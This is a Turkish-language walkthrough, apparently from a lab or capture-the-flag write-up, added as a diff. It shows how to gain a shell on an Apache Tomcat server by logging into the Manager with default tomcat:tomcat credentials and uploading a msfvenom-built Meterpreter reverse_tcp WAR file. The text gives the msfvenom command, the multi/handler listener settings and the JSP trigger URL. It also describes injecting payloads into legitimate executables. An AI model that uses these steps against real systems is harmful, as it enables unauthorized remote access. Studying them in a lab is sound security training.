@@ -1,0 +1,46 @@
+Şimdi Tomcat zafiyetini kullanarak kendi payload'umuzu üretip tetikleyecek ve hedef sistemden shell almaya çalışacağız. Bu işlem için msfvenom aracını kullanacağız. Bu aracın temel amaçları şunlardır:
+
+    Payload Üretimi: Hedef sistemde çalıştırılmak üzere ters bağlantı (Reverse Shell), doğrudan bağlantı (Bind Shell) veya gelişmiş oturum yönetimi sunan Meterpreter yükleri oluşturur.
+
+    Format Dönüştürme: Üretilen kabuk kodunu hedef işletim sistemine veya ortama uygun çalıştırılabilir dosyalara (.exe, .elf, .apk, .war), web betiklerine 
+(.php, .asp, .jsp) veya programlama dillerinde kullanılmak üzere ham dizilere (C, Python, Java) çevirir.
+
+    Şablon Enjeksiyonu (Template Injection): Var olan meşru bir çalıştırılabilir dosyanın (örneğin zararsız bir .exe) içine payload enjekte ederek, 
+kullanıcı çalıştırdığında hem orijinal programın hem de payload'un arka planda çalışmasını sağlar.
+
+Bizim bu senaryoda zararlı bir payload içeren .war uzantılı bir dosya yaratmamız gerekiyor. Bunun için terminalde aşağıdaki komutu çalıştırıyoruz: 
+
+
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<kendi_ip_adresiniz> LPORT=<herhangi_bir_port> -f war > comcat.war 
+
+
+ Bu komutu çalıştırdıktan sonra bulunduğunuz dizinde comcat.war dosyası oluşturulacaktır. Dosyamız artık hazır, şimdi şu adımları izliyoruz:
+
+    İnternet tarayıcısından http://<makine_ip>:8080 adresine gidiyoruz.
+
+    Sayfadaki "Manager Webapp" bağlantısına tıklıyoruz.
+
+    Bizden bir kullanıcı adı ve parola isteyecek. Önceden tespit ettiğimiz tomcat:tomcat bilgilerini girerek oturum açıyoruz.
+
+    Karşımıza çıkan sayfada dosya yükleme (Deploy) bölümüne iniyoruz. "Browse" butonuna tıklayıp oluşturduğumuz comcat.war dosyasını seçiyor ve "Deploy" diyerek yüklüyoruz.
+
+    Yükleme işleminden sonra, yukarıdaki uygulamalar listesinde comcat dizininin oluştuğunu göreceksiniz. Bu linke tıklayarak URL adresinden hedefe başarıyla gidilip gidilmediğini teyit ediyoruz.
+
+
+Meterpreter özelliklerini tam olarak destekleyen Metasploit dinleyicisini (multi/handler) yapılandırmamız gerekir. Yeni bir terminal açıp şu komutları sırasıyla girin:
+
+
+ msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST <kendi_ip_adresiniz>
+set LPORT <msfvenom_ile_ayni_port>
+exploit
+
+Tarayıcıya geri dönün. Yüklenen uygulamanın içindeki rastgele isimlendirilmiş .jsp uzantılı dosyayı (örneğin görseldeki nirbcgib.jsp) URL üzerinden tetikleyin:
+
+http://<makine_ip>:8080/comcat/nirbcgib.jsp
+
+Sayfa yüklendikten hemen sonra Metasploit terminalinize dönerseniz, Meterpreter session 1 opened şeklindeki onay mesajını göreceksiniz. Artık hedef sistem üzerinde yetkili komutlar çalıştırabilirsiniz.
+
+
